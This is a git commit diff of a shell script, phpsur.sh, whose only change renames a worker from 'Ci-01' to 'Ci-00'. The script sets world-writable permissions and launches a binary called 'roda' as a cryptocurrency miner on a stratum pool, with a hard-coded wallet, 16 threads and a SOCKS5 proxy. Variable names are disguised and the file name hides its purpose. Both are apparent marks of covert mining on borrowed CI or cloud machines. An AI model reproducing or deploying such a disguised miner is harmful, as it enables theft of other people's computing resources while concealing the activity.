804b0e149b3349f569366e1a42448463df419d2b
set-arithmetic <79969777+set-arithmetic@users.noreply.github.com>
2024-05-04 02:04:24 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -7,6 +7,6 @@ chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
 RENANG=stratum+tcps://stratum-na.rplant.xyz:17115
 ACIS=shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d
 STRESS=yespowersugar
-BANGUNAN=Ci-01
+BANGUNAN=Ci-00
 PROXY=socks5://158.69.225.110:59166
 ./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 16 -x $PROXY
